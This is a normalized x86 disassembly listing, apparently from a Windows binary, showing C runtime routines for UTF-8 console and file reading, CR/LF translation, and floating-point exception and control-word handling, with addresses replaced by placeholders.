mov [ eax + edx + 0x2b ] ch
mov eax [ esi * 4 + rw-data ]
pop esi
mov [ eax + edx + 0x2c ] 0xa
pop ebp
retn
sub_445912
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
call sub_44559b
mov ecx eax
add esp 0xc
test ecx ecx
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
and eax 0x3f
sar edx 0x6
push edi
imul edi eax 0x30
mov [ ebp - 0x4 ] edx
mov eax [ edx * 4 + rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ eax + edi + 0x29 ] 0x0
jne r-xdata
push esi
lea esi [ ebx - 0x1 ]
add esi ecx
mov al [ esi ]
test al al
js r-xdata
mov eax ecx
jmp r-xdata
xor edx edx
movzx eax al
inc edx
jmp r-xdata
inc esi
jmp r-xdata
pop edi
cmp [ eax + rw-data ] 0x0
je r-xdata
push [ ebp + 0x18 ]
sub esi ebx
push [ ebp + 0x14 ]
push esi
push ebx
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov edx eax
test edx edx
jne r-xdata
cmp edx 0x4
ja r-xdata
mov cl [ esi ]
movzx eax cl
movsx eax [ eax + rw-data ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp edx esi
mov ecx [ eax * 4 + rw-data ]
setne al
add al al
xor al [ ecx + edi + 0x2d ]
and al 0x2
xor [ ecx + edi + 0x2d ] al
lea eax [ edx + edx ]
call [ GetLastError@IAT ]
push eax
call sub_430f20
pop ecx
cmp esi ebx
jb r-xdata
inc eax
cmp eax edx
jne r-xdata
call sub_430f56
mov [ eax ] 0x2a
jmp r-xdata
pop esi
dec esi
inc edx
movzx eax [ esi ]
mov eax [ ebp - 0x8 ]
test [ eax + edi + 0x28 ] 0x48
je r-xdata
add esi edx
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
neg edx
mov eax edx
push 0x1
cdq
push edx
push eax
push [ ebp + 0x8 ]
call sub_43ed63
add esp 0x10
inc esi
mov [ eax + edi + 0x2a ] cl
cmp edx 0x2
jb r-xdata
cmp edx 0x3
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov al [ esi ]
inc esi
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + edi + 0x2b ] al
sub esi edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax * 4 + rw-data ]
mov al [ esi ]
inc esi
mov [ ecx + edi + 0x2c ] al
sub_445a62
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi edi
lea edx [ edi + eax * 2 ]
mov eax edi
cmp edi edx
jae r-xdata
sub esi edi
and esi 0xfffffffe
pop edi
mov eax esi
pop esi
pop ebp
retn
lea ecx [ edi + 0x2 ]
push ebx
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x3f
sar ecx 0x6
imul edx eax 0x30
mov ecx [ ecx * 4 + rw-data ]
or [ ecx + edx + 0x28 ] 0x2
cmp ebx 0xd
jne r-xdata
mov [ esi ] bx
add eax 0x2
add esi 0x2
add ecx 0x2
cmp ecx edx
jae r-xdata
movzx ebx [ eax ]
cmp ebx 0x1a
je r-xdata
jmp r-xdata
push 0xa
pop edi
cmp [ ecx ] di
mov edi [ ebp + 0xc ]
jne r-xdata
pop ebx
push 0xa
pop ebx
add eax 0x4
mov [ esi ] bx
add ecx 0x4
add esi 0x2
jmp r-xdata
cmp eax edx
jb r-xdata
sub_445ae3
push 0x14
push r--data
call sub_40d270
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_430f43
and [ eax ] 0x0
call sub_430f56
mov [ eax ] 0x9
jmp r-xdata
call sub_430f43
and [ eax ] 0x0
call sub_430f56
mov [ eax ] 0x9
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov [ ebp - 0x20 ] ecx
mov eax [ ebx * 4 + rw-data ]
movzx eax [ eax + ecx + 0x28 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
add eax 0x1
jne r-xdata
push esi
call sub_438cfe
pop ecx
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
test [ eax + ecx + 0x28 ] 0x1
jne r-xdata
call sub_430f43
and [ eax ] 0x0
call sub_430f56
mov [ eax ] 0x16
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_445bf6
add esp 0xc
mov edi eax
mov [ ebp - 0x1c ] edi
call sub_430f56
mov [ eax ] 0x9
call sub_430f43
and [ eax ] 0x0
jmp r-xdata
call sub_430e30
call sub_40d2b6
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_445bcd
mov eax edi
jmp r-xdata
sub_445bf6
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_430f43
and [ eax ] 0x0
call sub_430f56
mov [ eax ] 0x9
jmp r-xdata
call sub_430f43
and [ eax ] 0x0
call sub_430f56
mov [ eax ] 0x9
cmp ebx [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax ebx
mov [ ebp - 0x14 ] 0x1
and eax 0x3f
mov edi ebx
sar edi 0x6
imul edx eax 0x30
mov [ ebp - 0x10 ] edi
mov eax [ edi * 4 + rw-data ]
mov [ ebp - 0x18 ] edx
mov cl [ edx + eax + 0x28 ]
mov [ ebp - 0x1 ] cl
test cl 0x1
je r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx 0x7fffffff
jbe r-xdata
test ecx ecx
je r-xdata
call sub_430f43
and [ eax ] 0x0
call sub_430f56
mov [ eax ] 0x16
jmp r-xdata
xor eax eax
jmp r-xdata
test [ ebp - 0x1 ] 0x2
jne r-xdata
call sub_430e30
pop edi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] 0x0
je r-xdata
push esi
mov esi [ edx + eax + 0x18 ]
mov al [ edx + eax + 0x29 ]
mov [ ebp - 0x1 ] al
mov [ ebp - 0x1c ] esi
xor esi esi
movsx eax al
sub eax 0x1
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax ecx
not eax
test dl al
jne r-xdata
sub eax 0x1
jne r-xdata
push 0x4
pop eax
shr ecx 0x1
mov [ ebp - 0xc ] eax
cmp ecx eax
jb r-xdata
call sub_430f43
and [ eax ] esi
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax ecx
not eax
test al 0x1
je r-xdata
push eax
call sub_42d3eb
push 0x0
mov esi eax
call sub_42d3b1
push 0x0
call sub_42d3b1
add esp 0xc
mov [ ebp - 0x8 ] esi
test esi esi
jne r-xdata
mov eax ecx
mov [ ebp - 0xc ] ecx
or edi 0xffffffff
mov ebx [ ebp - 0x10 ]
xor edi edi
mov [ ebp - 0x24 ] eax
mov ebx [ ebx * 4 + rw-data ]
mov [ ebp - 0x20 ] ebx
test [ edx + ebx + 0x28 ] 0x48
mov ebx [ ebp + 0x8 ]
je r-xdata
push [ ebp - 0x14 ]
push 0x0
push 0x0
push ebx
call sub_43ed63
mov ecx [ edi * 4 + rw-data ]
add esp 0x10
mov edi [ ebp - 0x18 ]
mov [ edi + ecx + 0x20 ] eax
mov eax esi
mov [ edi + ecx + 0x24 ] edx
mov edx edi
mov ecx [ ebp - 0xc ]
call sub_430f56
mov [ eax ] 0xc
call sub_430f43
mov [ eax ] 0x8
jmp r-xdata
push ebx
call sub_43e954
pop ecx
test eax eax
je r-xdata
mov ebx [ ebp - 0x20 ]
mov bl [ edx + ebx + 0x2a ]
mov [ ebp - 0x2 ] bl
cmp bl 0xa
mov ebx [ ebp + 0x8 ]
je r-xdata
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
mov eax [ eax * 4 + rw-data ]
test [ ecx + eax + 0x28 ] 0x80
je r-xdata
test ecx ecx
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop edi
cmp eax edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp [ ebp - 0x20 ] ecx
ja r-xdata
lea eax [ ebp - 0x28 ]
push eax
push [ ebp - 0x1c ]
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
mov bl [ ebp - 0x2 ]
mov edi [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
mov ebx [ ebp + 0x8 ]
dec ecx
cmp [ ebp - 0x1 ] 0x0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov eax [ eax * 4 + rw-data ]
mov [ edx + eax + 0x2a ] 0xa
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_430f56
mov [ eax ] 0x9
call sub_430f43
mov [ eax ] edi
jmp r-xdata
add edi [ ebp - 0x20 ]
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
mov al [ edx + eax + 0x2b ]
mov [ ebp - 0x2 ] al
cmp al 0xa
je r-xdata
push eax
call sub_430f20
pop ecx
xor edi edi
jmp r-xdata
push esi
call sub_42d3b1
pop ecx
mov eax edi
pop esi
jmp r-xdata
cmp [ ebp - 0x1 ] 0x2
je r-xdata
push 0x0
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x1c ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push 0x0
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x1c ]
call [ ReadConsoleW@IAT ]
test eax eax
jne r-xdata
test ecx ecx
je r-xdata
shr edi 0x1
cmp [ ebp - 0x14 ] 0x0
push edi
push [ ebp - 0x24 ]
push ebx
je r-xdata
shr ecx 0x1
push ecx
push [ ebp + 0xc ]
push edi
push [ ebp - 0x8 ]
push ebx
call sub_445912
add esp 0x14
mov eax [ ebp - 0x20 ]
mov ecx [ ebp + 0x10 ]
lea edi [ edi + eax * 2 ]
jmp r-xdata
call [ GetLastError@IAT ]
mov eax [ ebp - 0x8 ]
mov bl [ ebp - 0x2 ]
push 0x2
pop edi
mov [ eax ] bl
inc eax
mov ebx [ ebp + 0x8 ]
dec ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov eax [ eax * 4 + rw-data ]
mov [ edx + eax + 0x2b ] 0xa
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x14 ]
jne r-xdata
call sub_4456f2
jmp r-xdata
call sub_445a62
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov eax [ eax * 4 + rw-data ]
test [ edx + eax + 0x28 ] 0x80
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
mov al [ edx + eax + 0x2c ]
mov [ ebp - 0x2 ] al
cmp al 0xa
je r-xdata
add esp 0xc
jmp r-xdata
mov edi eax
jmp r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp - 0x8 ]
mov bl [ ebp - 0x2 ]
push 0x3
pop edi
mov [ eax ] bl
inc eax
mov ebx [ ebp + 0x8 ]
dec ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov eax [ eax * 4 + rw-data ]
mov [ edx + eax + 0x2c ] 0xa
sub_445fab
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0x180
push eax
call sub_445fd0
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_445fd0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
test eax 0xfffffe7f
jne r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
mov [ rw-data ] eax
xor eax eax
pop esi
pop ebp
retn
sub_446041
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
cmp [ ecx ] al
je r-xdata
pop ebp
retn
cmp eax [ ebp + 0xc ]
je r-xdata
inc eax
cmp [ eax + ecx ] 0x0
jne r-xdata
sub_44605d
mov edi edi
push ebp
mov ebp esp
push esi
call sub_44728e
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_4472d1
mov [ esi + 0x4 ] eax
xor eax eax
pop esi
pop ebp
retn
sub_44607a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push esi
mov esi [ ebp + 0x8 ]
push [ esi ]
call sub_447379
push [ esi + 0x4 ]
call sub_4473f9
lea eax [ ebp - 0x8 ]
push eax
call sub_44605d
mov eax [ esi ]
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
inc eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
xor eax eax
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_4460c3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
and [ ebp - 0x4 ] 0x0
push eax
call sub_44605d
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ecx ] edx
or edx 0x1f
push eax
mov [ ebp - 0x8 ] edx
call sub_44607a
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
call sub_43cc0b
xor eax eax
mov esp ebp
pop ebp
retn
sub_446120
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ esp + 0x4 ]
call sub_443435
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_447498
sub_446160
cmp [ rw-data ] 0x0
je r-xdata
sub esp 0xc
fst [ esp ]
call sub_443478
call sub_4461b8
add esp 0xc
retn
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_447480
sub_4461b8
push edx
fwait
fnstcw [ esp ]
je r-xdata
test eax 0xfffff
jne r-xdata
mov eax [ esp + 0xc ]
cmp [ esp ] 0x27f
je r-xdata
call sub_44341c
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
test eax 0x7ff00000
je r-xdata
fldcw [ r--data ]
cmp [ rw-data ] 0x0
jne r-xdata
and eax 0x80000000
je r-xdata
test eax 0xfffff
jne r-xdata
test eax 0x80000000
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
lea ecx [ r--data ]
mov edx 0x1b
call sub_443597
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
fstp st0
fld [ r--data ]
mov eax 0x1
jmp r-xdata
test eax 0x80000000
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
fldlg2
fxch st1
fyl2x
pop edx
retn
fldcw [ esp ]
lea ecx [ r--data ]
mov edx 0x1b
jmp r-xdata
jmp r-xdata
fstp st0
fld [ r--data ]
mov eax 0x2
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_443597
pop edx
retn
sub_446270
cmp [ rw-data ] 0x0
je r-xdata
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi 0xffff
push esi
push 0x1b3f
call sub_444eaf
fld [ ebp + 0x8 ]
mov ebx eax
pop ecx
pop ecx
movzx ecx [ ebp + 0xe ]
mov eax 0x7ff0
and ecx eax
push ecx
push ecx
fstp [ esp ]
cmp cx ax
jne r-xdata
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
call sub_447d27
fst [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0x8
fucom st1
fnstsw ax
test ah 0x44
jpe r-xdata
call sub_447b34
dec eax
pop ecx
pop ecx
cmp eax 0x2
ja r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
test bl 0x20
jne r-xdata
push esi
fstp st1
push ebx
fstp st0
call sub_444eaf
fld [ ebp - 0x8 ]
pop ecx
pop ecx
jmp r-xdata
fld [ ebp + 0x8 ]
fld [ r--data ]
push ebx
sub esp 0x10
fadd st1
fstp [ esp + 0x8 ]
fstp [ esp ]
push 0xc
push 0x8
jmp r-xdata
push esi
push ebx
call sub_444eaf
fld [ ebp + 0x8 ]
pop ecx
pop ecx
jmp r-xdata
jmp r-xdata
push ebx
sub esp 0x10
fxch st1
fstp [ esp + 0x8 ]
fstp [ esp ]
push 0xc
push 0x10
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4463c1
add esp 0x1c
movq xmm0 [ esp + 0x4 ]
movapd xmm2 [ r--data ]
movapd xmm1 xmm0
movapd xmm7 xmm0
psrlq xmm0 0x34
movd eax xmm0
andpd xmm0 [ r--data ]
psubd xmm2 xmm0
psrlq xmm1 xmm2
test eax 0x800
je r-xdata
movq xmm0 [ esp + 0x4 ]
psllq xmm1 xmm2
movapd xmm3 xmm0
cmppd xmm0 xmm1 0x6
cmp eax 0x3ff
jl r-xdata
cmp eax 0xbff
jl r-xdata
cmppd xmm3 [ r--data ] 0x6
andpd xmm3 [ r--data ]
movq [ esp + 0x4 ] xmm3
fld [ esp + 0x4 ]
retn
cmp eax 0x432
jg r-xdata
fld [ r--data ]
retn
psllq xmm1 xmm2
cmp eax 0xc32
jg r-xdata
ucomisd xmm7 xmm7
jpo r-xdata
andpd xmm0 [ r--data ]
addsd xmm1 xmm0
movq [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
retn
movq [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
retn
fld [ esp + 0x4 ]
retn
mov edx 0x3ec
sub esp 0x10
mov [ esp + 0xc ] edx
mov edx esp
add edx 0x14
mov [ esp + 0x8 ] edx
mov [ esp + 0x4 ] edx
mov [ esp ] edx
call sub_435f92
add esp 0x10
sub_44638d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test al 0x20
je r-xdata
test al 0x8
je r-xdata
push 0x5
jmp r-xdata
test al 0x4
je r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
test al 0x1
je r-xdata
push 0x2
jmp r-xdata
movzx eax al
and eax 0x2
add eax eax
pop ebp
retn
push 0x3
sub_4463c1
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebx + 0x20 ]
lea eax [ ebx + 0x18 ]
push edi
push esi
push eax
push [ ebx + 0x8 ]
call sub_446597
add esp 0xc
test eax eax
jne r-xdata
push [ ebx + 0x8 ]
call sub_44638d
pop ecx
mov edi eax
call sub_429e4e
test al al
je r-xdata
and [ ebp - 0x40 ] 0xfffffffe
push eax
lea eax [ ebx + 0x18 ]
push eax
lea eax [ ebx + 0x10 ]
push eax
push [ ebx + 0xc ]
lea eax [ ebx + 0x20 ]
push [ ebx + 0x8 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_4467a7
mov esi [ ebx + 0x20 ]
add esp 0x1c
push edi
call sub_446abb
mov [ esp ] 0xffff
push esi
call sub_444eaf
fld [ ebx + 0x18 ]
pop ecx
pop ecx
test edi edi
je r-xdata
fld [ ebx + 0x18 ]
push esi
sub esp 0x18
fstp [ esp + 0x10 ]
fldz
fstp [ esp + 0x8 ]
fld [ ebx + 0x10 ]
fstp [ esp ]
push [ ebx + 0xc ]
push edi
call sub_446aea
add esp 0x24
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
sub_44648f
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebx + 0x28 ]
lea eax [ ebx + 0x20 ]
push edi
push esi
push eax
push [ ebx + 0x8 ]
call sub_446597
fld [ ebx + 0x18 ]
add esp 0xc
test eax eax
jne r-xdata
fstp st0
mov eax [ ebp - 0x40 ]
and eax 0xffffffe3
or eax 0x3
mov [ ebp - 0x40 ] eax
lea eax [ ebx + 0x20 ]
push 0x0
push eax
lea eax [ ebx + 0x10 ]
push eax
push [ ebx + 0xc ]
lea eax [ ebx + 0x28 ]
push [ ebx + 0x8 ]
fstp [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_4467a7
mov esi [ ebx + 0x28 ]
add esp 0x1c
jmp r-xdata
push edi
call sub_446abb
mov [ esp ] 0xffff
push esi
call sub_444eaf
fld [ ebx + 0x20 ]
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebx + 0x8 ]
call sub_44638d
pop ecx
mov edi eax
call sub_429e4e
test al al
je r-xdata
fld [ ebx + 0x20 ]
push esi
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebx + 0x18 ]
fstp [ esp + 0x8 ]
fld [ ebx + 0x10 ]
fstp [ esp ]
push [ ebx + 0xc ]
push edi
call sub_446aea
add esp 0x24
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
sub_446571
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x1d
jl r-xdata
cmp [ eax * 8 + r--data ] ecx
je r-xdata
xor eax eax
pop ebp
retn
sub_446597
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ebx
and esi 0x1f
test bl 0x8
je r-xdata
mov eax ebx
and eax [ ebp + 0x10 ]
test al 0x4
je r-xdata
test [ ebp + 0x10 ] 0x1
je r-xdata
test bl 0x1
je r-xdata
push 0x4
call sub_444edb
pop ecx
and esi 0xfffffffb
jmp r-xdata
push 0x1
call sub_444edb
pop ecx
and esi 0xfffffff7
jmp r-xdata
test bl 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
test bl 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_444edb
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx 0xc00
and eax ecx
je r-xdata
xor eax eax
test esi esi
pop esi
sete al
pop ebx
mov esp ebp
pop ebp
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
push edi
xor edi edi
test bl 0x10
je r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x400
je r-xdata
push 0x20
call sub_444edb
pop ecx
and esi 0xffffffef
mov ecx [ ebp + 0xc ]
fld [ ecx ]
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
inc edi
fld [ r--data ]
fld [ r--data ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x800
je r-xdata
xor edi edi
inc edi
fld [ ecx ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_4479ef
mov eax [ ebp - 0x4 ]
add esp 0xc
add eax 0xfffffa00
mov [ ebp - 0x4 ] eax
fst [ ebp - 0x10 ]
fldz
cmp eax 0xfffffbce
jge r-xdata
fstp [ ecx ]
fld [ r--data ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax ecx
jne r-xdata
and esi 0xfffffffd
push 0x10
call sub_444edb
pop ecx
fcompp
xor edx edx
fnstsw ax
test ah 0x41
jne r-xdata
xor edi edi
fmulp st1
inc edi
jmp r-xdata
fld [ r--data ]
jmp r-xdata
and esi 0xfffffffe
jmp r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
fld [ r--data ]
test ah 0x5
jpo r-xdata
mov eax [ ebp - 0xa ]
mov ecx 0xfffffc03
and eax 0xf
or eax 0x10
mov [ ebp - 0xa ] ax
mov eax [ ebp - 0x4 ]
cmp eax ecx
jge r-xdata
inc edx
mov eax [ ebp + 0xc ]
fstp [ eax ]
jmp r-xdata
fchs
jmp r-xdata
fld [ ebp - 0x10 ]
test edx edx
je r-xdata
sub ecx eax
mov eax [ ebp - 0x10 ]
test edi edi
pop edi
je r-xdata
fchs
shr eax 0x1
test [ ebp - 0xc ] 0x1
mov [ ebp - 0x10 ] eax
je r-xdata
test edi edi
jne r-xdata
shr [ ebp - 0xc ] 0x1
sub ecx 0x1
jne r-xdata
or eax 0x80000000
mov [ ebp - 0x10 ] eax
inc edi
test [ ebp - 0x10 ] 0x1
je r-xdata
sub_446784
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4467a7
add esp 0x1c
pop ebp
retn
sub_4467a7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebx
xor ebx ebx
inc ebx
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push edi
mov edi 0xc000000d
mov [ eax + 0x8 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp + 0x10 ]
test cl 0x10
je r-xdata
test cl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc000008f
or [ eax + 0x4 ] ebx
test cl 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000093
or [ eax + 0x4 ] 0x2
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000091
or [ eax + 0x4 ] 0x4
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc000008e
or [ eax + 0x4 ] 0x8
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
shl eax 0x4
not eax
xor eax [ ecx + 0x8 ]
and eax 0x10
xor [ ecx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
add eax eax
not eax
xor eax [ ecx + 0x8 ]
and eax 0x8
xor [ ecx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
shr eax 0x1
not eax
xor eax [ ecx + 0x8 ]
and eax 0x4
xor [ ecx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
shr eax 0x3
not eax
xor eax [ ecx + 0x8 ]
and eax 0x2
xor [ ecx + 0x8 ] eax
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
shr eax 0x5
not eax
xor eax [ ecx + 0x8 ]
and eax ebx
xor [ ecx + 0x8 ] eax
call sub_444f36
mov edx eax
test dl 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000090
or [ eax + 0x4 ] 0x10
test dl 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test dl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x8
test dl 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x4
test dl 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x2
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
